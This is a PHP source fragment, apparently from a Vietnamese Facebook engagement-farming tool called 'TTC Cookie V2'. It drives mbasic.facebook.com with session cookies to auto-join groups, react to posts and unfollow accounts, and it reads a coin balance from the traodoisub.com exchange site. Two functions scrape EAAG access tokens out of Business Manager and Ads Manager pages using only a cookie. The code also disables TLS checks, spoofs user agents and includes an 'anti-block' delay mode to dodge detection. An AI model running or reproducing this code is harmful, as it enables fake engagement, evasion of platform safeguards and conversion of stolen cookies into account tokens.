    $data            = explode('"', explode('/a/group/join/', $a)[1])[0];
    $l1 = explode('amp;', $data)[0];
    $l2 = explode('amp;', $data)[1];
    $l3 = explode('amp;', $data)[2];
    $fb_dtsg            = explode('" autocomplete="off"', explode('name="fb_dtsg" value="', $a)[1])[0];
    $jazoest            = explode('" autocomplete="off"', explode('name="jazoest" value="', $a)[1])[0];

    $link = "https://mbasic.facebook.com/a/group/join/" . $l1 . "" . $l2 . "" . $l3 . "";
    if ($link == 'https://mbasic.facebook.com/a/group/join/') {
    } else {
        $data = "fb_dtsg=" . $fb_dtsg . "&jazoest=" . $jazoest . "";
        $header = array(
            "Host: mbasic.facebook.com",
            "content-length: " . strlen($data),
            "cache-control: max-age=0",
            "origin: https://mbasic.facebook.com",
            "upgrade-insecure-requests: 1",
            "content-type: application/x-www-form-urlencoded",
            "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36",
            "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "referer: " . $url . ""
        );
        $ch   = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => $link,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_SSL_VERIFYPEER => 0,
            CURLOPT_COOKIE => $cookie,
            CURLOPT_HTTPHEADER => $header,
            CURLOPT_ENCODING => TRUE,
            CURLOPT_FOLLOWLOCATION => true
        ));
        $cc = curl_exec($ch);
        $location = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
        curl_close($ch);
    }
    return $location;
}

function reaction_cmt($id, $idfb, $type, $cookie)
{
    $url  = "https://mbasic.facebook.com/" . $id . "";
    $head = array(
        "Host: mbasic.facebook.com",
        "upgrade-insecure-requests: 1",
        "save-data: on",
        "user-agent: Mozilla/5.0 (Linux; Android 10; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
        "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*" . "/" . "*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "sec-fetch-site: same-origin",
        "sec-fetch-mode: navigate",
        "sec-fetch-user: ?1",
        "sec-fetch-dest: document",
        "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
    );
    $ch   = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_POST => 1,
        CURLOPT_HTTPGET => true,
        CURLOPT_SSL_VERIFYPEER => 0,
        CURLOPT_HTTPHEADER => $head,
        CURLOPT_HEADER => true,
        CURLOPT_COOKIE => $cookie,
        CURLOPT_ENCODING => TRUE
    ));
    $data = curl_exec($ch);
    $one = explode("location: ", $data);
    $two = explode("rdr", $one[1]);
    $url = $two[0] . "rdr";
    if ($url == 'rdr') {
    } else {
        $idpost = explode('&id=', $url)[0];
        $idvictim = explode('&id=', $url)[1];
        curl_close($ch);
        if (strpos($data, "xs=deleted") == true) {
            //print "\033[1;37m→\033[1;31m Die Cookie !!!\n";
            //exit();
        }
        $head = array(
            "Host: mbasic.facebook.com",
            "cache-control: max-age=0",
            "sec-ch-ua-mobile: ?1",
            "save-data: on",
            "upgrade-insecure-requests: 1",
            "user-agent: Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36",
            "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "sec-fetch-site: none",
            "sec-fetch-mode: navigate",
            "sec-fetch-user: ?1",
            "sec-fetch-dest: document"
        );
        $ch   = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => 'https://mbasic.facebook.com/reactions/picker/?ft_id=' . $id . '&origin_uri=https://mbasic.facebook.com/' . $idvictim . '/posts/' . $idpost . '/?app=fbl&fbt_id=' . $id . '&lul&av=' . $idfb . '&__tn__=R',
            CURLOPT_FOLLOWLOCATION => false,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_POST => 1,
            CURLOPT_HTTPGET => true,
            CURLOPT_SSL_VERIFYPEER => 0,
            CURLOPT_HTTPHEADER => $head,
            CURLOPT_HEADER => true,
            CURLOPT_COOKIE => $cookie,
            CURLOPT_ENCODING => TRUE
        ));
        $cx = curl_exec($ch);
        $haha = explode('<a href="', $cx);
        if ($type == 'LOVE') {
            $haha2 = explode('" style="display:block"', $haha[2])[0];
        } else if ($type == 'CARE') {
            $haha2 = explode('" style="display:block"', $haha[3])[0];
        } else if ($type == 'HAHA') {
            $haha2 = explode('" style="display:block"', $haha[4])[0];
        } else if ($type == 'WOW') {
            $haha2 = explode('" style="display:block"', $haha[5])[0];
        } else if ($type == 'SAD') {
            $haha2 = explode('" style="display:block"', $haha[6])[0];
        } else {
            $haha2 = explode('" style="display:block"', $haha[7])[0];
        }
        if ($type == 'LIKE') {
            $data            = explode('"', explode('<a href="/ufi/reaction/?ft_ent_identifier=', $cx)[1])[0];
            curl_setopt($ch, CURLOPT_URL, 'https://mbasic.facebook.com/ufi/reaction/?ft_ent_identifier=' . htmlspecialchars_decode($data));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_exec($ch);
            curl_close($ch);
        } else {
            $link2 = html_entity_decode($haha2);
            curl_setopt($ch, CURLOPT_URL, 'https://mbasic.facebook.com' . $link2);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            $x = curl_exec($ch);
            $location = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
            curl_close($ch);
        }
    }
    return $location;
}
function loadtime($loai)
{
    $so = 0;
    $delay = $_SESSION['' . $loai . '']  * 15;
    for ($x = 0; $x < $delay; $x++) {
        if ($x % 15 == 0) {
            $so++;
        }
        global $mau19;
        global $mau18;
        global $mau17;
        global $mau16;
        global $mau15;
        global $mau14;
        global $mau13;
        global $mau12;
        global $mau11;
        global $mau10;
        global $mau9;
        global $mau8;
        global $mau7;
        global $mau6;
        global $mau5;
        global $mau4;
        global $mau3;
        global $mau2;
        global $mau1;
        $maurand = "\033[1;3" . rand(1, 7) . "m";
        $mau19 = $mau18;
        $mau18 = $mau17;
        $mau17 = $mau16;
        $mau16 = $mau15;
        $mau15 = $mau14;
        $mau14 = $mau13;
        $mau13 = $mau12;
        $mau12 = $mau11;
        $mau11 = $mau10;
        $mau10 = $mau9;
        $mau9  =  $mau8;
        $mau8  =  $mau7;
        $mau7  =  $mau6;
        $mau6  =  $mau5;
        $mau5  =  $mau4;
        $mau4  =  $mau3;
        $mau3  =  $mau2;
        $mau2  =  $mau1;
        $mau1  =  $maurand;
        echo "\r                   \r";
        echo "\r\e[1;95m    🍉" . $mau19 . "A" . $mau18 . "N" . $mau17 . " O" . $mau15 . "R" . $mau14 . "I" . $mau13 . "N🍉       T" . $mau10 . "T" . $mau9 . "C" . $mau8 . "-" . $mau7 . "C" . $mau6 . "K" . $mau5 . " <" . $mau4 . " <" . $mau3 . " | " . $mau2 . "$so" . $mau1 . " |           \r";
        usleep(13000);
        echo "\r                   \r";
        echo "\r\e[1;95m    🍉" . $mau19 . "A" . $mau18 . "N" . $mau17 . " O" . $mau15 . "R" . $mau14 . "I" . $mau13 . "N🍉       T" . $mau10 . "T" . $mau9 . "C" . $mau8 . "-" . $mau7 . "C" . $mau6 . "K" . $mau5 . " <" . $mau4 . " <" . $mau3 . " | " . $mau2 . "$so" . $mau1 . " |           \r";
        usleep(13500);
        echo "\r                   \r";
        echo "\r\e[1;95m    🍉" . $mau19 . "A" . $mau18 . "N" . $mau17 . " O" . $mau15 . "R" . $mau14 . "I" . $mau13 . "N🍉       T" . $mau10 . "T" . $mau9 . "C" . $mau8 . "-" . $mau7 . "C" . $mau6 . "K" . $mau5 . " <" . $mau4 . " <" . $mau3 . " | " . $mau2 . "$so" . $mau1 . " |           \r";
        usleep(13000);
        echo "\r                   \r";
        echo "\r\e[1;95m    🍉" . $mau19 . "A" . $mau18 . "N" . $mau17 . " O" . $mau15 . "R" . $mau14 . "I" . $mau13 . "N🍉       T" . $mau10 . "T" . $mau9 . "C" . $mau8 . "-" . $mau7 . "C" . $mau6 . "K" . $mau5 . " <" . $mau4 . " <" . $mau3 . " | " . $mau2 . "$so" . $mau1 . " |           \r";
        usleep(13500);
        echo "\r                   \r";
        echo "\r\e[1;95m    🍉" . $mau19 . "A" . $mau18 . "N" . $mau17 . " O" . $mau15 . "R" . $mau14 . "I" . $mau13 . "N🍉       T" . $mau10 . "T" . $mau9 . "C" . $mau8 . "-" . $mau7 . "C" . $mau6 . "K" . $mau5 . " <" . $mau4 . " <" . $mau3 . " | " . $mau2 . "$so" . $mau1 . " |           \r";
        usleep(13000);
        echo "\r";
        echo " \r";
    }
    echo "\r\e[1;95m    🍉An Orin 🍉    TTC Cookie ĐA LUỒNG                  \r";
    if (!file_exists('Run_tool.txt')) {
        echo "\r‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿\n";
        echo "Tạm dừng - enter để chạy tiếp hoặc nhập 1 để thêm Cookie:";
        $js = trim(fgets(STDIN));
        //$js = $codeao;
        $k = fopen("Run_tool.txt", "w+");
        fwrite($k, $js);
        fclose($k);
        if ($js == '1') {
            echo "\033[0;32m Nhập Cookie Facebook Dừng Thì\033[0;37m Enter\n";
            for ($a = 1; $a < 999999; $a++) {
                echo "\033[0;32m Nhập Cookie Thứ\033[0;37m $a: \033[0;33m";
                $nhapck = (string)trim(fgets(STDIN));
                if ($nhapck == '') {
                    break;
                }
                array_push($khoToken, $nhapck);
            }
        }
    }
}
function chongbl($loai)
{
    for ($x = $_SESSION['' . $loai . '']; $x--; $x) {
        print "\033[1;30mĐang Chạy Chế Độ Chống Block Vui Lòng Đợi \033[1;31m| \033[1;33m$x \033[1;31m|\033[1;30m Giây";
        sleep(1);
        print "\r                                          \r";
    }
}
function gettoken($cookie, $useragent)
{
    $head = array("Connection: keep-alive", "Keep-Alive: 300", "authority: business.facebook.com", "ccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7", "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5", "cache-control: max-age=0", "upgrade-insecure-requests: 1", "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "sec-fetch-site: none", "sec-fetch-mode: navigate", "sec-fetch-user: ?1", "sec-fetch-dest: document");
    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://business.facebook.com/business_locations",
        CURLOPT_USERAGENT => $useragent,
        CURLOPT_COOKIE => $cookie,
        CURLOPT_HTTPHEADER => $head,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_SSL_VERIFYPEER => FALSE,
        CURLOPT_TIMEOUT => 60,
        CURLOPT_CONNECTTIMEOUT => 60,
        CURLOPT_FOLLOWLOCATION => TRUE
    ));
    $access = curl_exec($ch);
    curl_close($ch);
    $access_token = 'EAAG' . explode('","', explode('EAAG', $access)[1])[0];
    if (strlen($access_token) > 5) {
        return $access_token;
    } else {
        return 'die';
    }
}
function    getxu()
{
    $url = "https://traodoisub.com/scr/user.php";
    $head = array(
        "Host: traodoisub.com",
        "accept: application/json, text/javascript, */*; q=0.01",
        "x-requested-with: XMLHttpRequest",
        "save-data: on",
        "user-agent: Mozilla/5.0 (Linux; Android 10; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
        "sec-fetch-site: same-origin",
        "sec-fetch-mode: cors",
        "sec-fetch-dest: empty",
        "referer: https://traodoisub.com/home/"
    );
    $ch   = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_FOLLOWLOCATION => TRUE,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_POST => 1,
        CURLOPT_HTTPGET => true,
        CURLOPT_SSL_VERIFYPEER => 0,
        CURLOPT_COOKIEFILE => "TDS.txt",
        CURLOPT_HTTPHEADER => $head,
        CURLOPT_ENCODING => TRUE
    ));
    $data = curl_exec($ch);
    curl_close($ch);
    $json = json_decode($data, true);
    $sodu = $json["xu"];
    return $sodu;
}

function huyfollow($id, $useragent, $cookie)
{
    $ch = curl_init();
    if (strpos($id, '_')) {
        $uid = explode('_', $id, 2);
        $id2 = 'story.php?story_fbid=' . $uid[1] . '&id=' . $uid[0];
    } else {
        $id2 = $id;
    }

    $header = array(
        "Host:mbasic.facebook.com",
        "user-agent:$useragent",
        "accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "cookie:$cookie",
    );
    //ketnoimangV1();
    $linkbv = 'https://mbasic.facebook.com/' . $id2;
    curl_setopt($ch, CURLOPT_URL, $linkbv);
    $head[] = "Connection: keep-alive";
    $head[] = "Keep-Alive: 300";
    $head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
    $head[] = "Accept-Language: en-us,en;q=0.5";
    curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
    curl_setopt($ch, CURLOPT_ENCODING, '');
    curl_setopt($ch, CURLOPT_COOKIE, $cookie);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect
                    :'));
    // json_decode(curl_exec($ch), true);
    $post = curl_exec($ch);


    $link = explode('<a href="/a/subscriptions/remove?subject_id=', $post)[1];
    $link = explode('"', $link)[0];
    $link = html_entity_decode($link);
    $link = "https://mbasic.facebook.com/a/subscriptions/remove?subject_id=" . $link;
    // echo $link;
    // die();
    $linkreac1 = $link;
    $header = array(
        "Host:mbasic.facebook.com",
        "user-agent:$useragent",
        "accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "referer:$linkbv",
        "cookie:$cookie",
    );
    //ketnoimangV1();
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $linkreac1);
    $head[] = "Connection: keep-alive";
    $head[] = "Keep-Alive: 300";
    $head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
    $head[] = "Accept-Language: en-us,en;q=0.5";
    curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
    curl_setopt($ch, CURLOPT_ENCODING, '');
    curl_setopt($ch, CURLOPT_COOKIE, $cookie);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
    $page = curl_exec($ch);
    $aa = $page;

    return $aa;
}
function load($tb_, $delay){
for($i = 0; $i < strlen($tb_); $i++){echo $tb_[$i];usleep($delay);}
}
function logofull($banner)
{
load($banner."
\033[1;31m────────────────────────────────────────────────────────────
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;33mTOOL TTC COOKIE V2
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;35mADMIN: \033[1;36mAN ORIN
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;36mFB: \033[1;31manorintool
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mBOX SUPPORT: \033[1;37mhttps://zalo.me/g/dpfbxq529
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;34mYOUTUBE: \033[1;37mhttps://youtube.com/@AnOrinTool403
\033[1;31m────────────────────────────────────────────────────────────\n", $delay = 500);
}
function ketnoimangV1()
{
    while (!$sock = @fsockopen('shopdragonx.com', 80)) {
        $load = "\r\033[91m Vui Lòng Kiểm Tra Kết Nối Internet";
        $string = strlen($load);
        for ($j = 0; $j <= $string; $j++) {
            echo $load[$j];
            usleep(5000);
        }
        sleep(1);
        echo "\r                                   ";
        $load = "\r\033[92m Đang Thử Kết Nối Lại...";
        $string = strlen($load);
        for ($j = 0; $j <= $string; $j++) {
            echo $load[$j];
            usleep(20000);
        }
        sleep(3);
        echo "\r                                   ";
        $load = "\r\033[92m Đang Thử Kết Nối Lại...";
        $string = strlen($load);
        for ($j = 0; $j <= $string; $j++) {
            echo $load[$j];
            usleep(20000);
        }
        sleep(3);
        echo "\r                        ";
        if ($sock = @fsockopen('shopdragonx.com', 80)) {
            echo "\r                                   ";
            $load = "\r\033[92m Đã Có Mạng Trở Lại, Kết Nối Thành Công!...";
            $string = strlen($load);
            for ($j = 0; $j <= $string; $j++) {
                echo $load[$j];
                usleep(20000);
            }
            sleep(3);
            break;
        }
    }
}
function lay_token_moi_v1($cookie)
{
    $useragent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.facebook.com/adsmanager/manage/campaigns');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

    $headers = array();
    $headers[] = 'Authority: business.facebook.com';
    $headers[] = 'Cache-Control: max-age=0';
    $headers[] = 'Sec-Ch-Ua: \"Google Chrome\";v=\"95\", \"Chromium\";v=\"95\", \";Not A Brand\";v=\"99\"';
    $headers[] = 'Sec-Ch-Ua-Mobile: ?0';
    $headers[] = 'Sec-Ch-Ua-Platform: \"Windows\"';
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    $headers[] = 'User-Agent: ' . $useragent;
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
    $headers[] = 'Sec-Fetch-Site: same-origin';
    $headers[] = 'Sec-Fetch-Mode: navigate';
    $headers[] = 'Sec-Fetch-User: ?1';
    $headers[] = 'Sec-Fetch-Dest: document';
    $headers[] = 'Accept-Language: en-US,en;q=0.9';
    $headers[] = 'Cookie: ' . $cookie;
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $access = curl_exec($ch);
    if (curl_errno($ch)) {
        return 'die';
    }
    curl_close($ch);
    
    
    $ch = curl_init();
    $link = explode('&nav_source', explode('campaigns?act=', $access) [1]) [0];
    curl_setopt($ch, CURLOPT_URL, 'https://www.facebook.com/adsmanager/manage/campaigns?act='.$link.'&nav_source=no_referrer');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
    $headers = array();
    $headers[] = 'Authority: business.facebook.com';
    $headers[] = 'Cache-Control: max-age=0';
    $headers[] = 'Sec-Ch-Ua: \"Google Chrome\";v=\"95\", \"Chromium\";v=\"95\", \";Not A Brand\";v=\"99\"';
    $headers[] = 'Sec-Ch-Ua-Mobile: ?0';
    $headers[] = 'Sec-Ch-Ua-Platform: \"Windows\"';
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    $headers[] = 'User-Agent: ' . $useragent;
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
    $headers[] = 'Sec-Fetch-Site: same-origin';
    $headers[] = 'Sec-Fetch-Mode: navigate';
    $headers[] = 'Sec-Fetch-User: ?1';
    $headers[] = 'Sec-Fetch-Dest: document';
    $headers[] = 'Accept-Language: en-US,en;q=0.9';
    $headers[] = 'Cookie: ' . $cookie;
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $access1 = curl_exec($ch);
    $access_token = explode('";', explode('accessToken="', $access1) [1]) [0];
    if ($access_token != '') {
        return $access_token;
    }else{
        return 'die';
    }
}
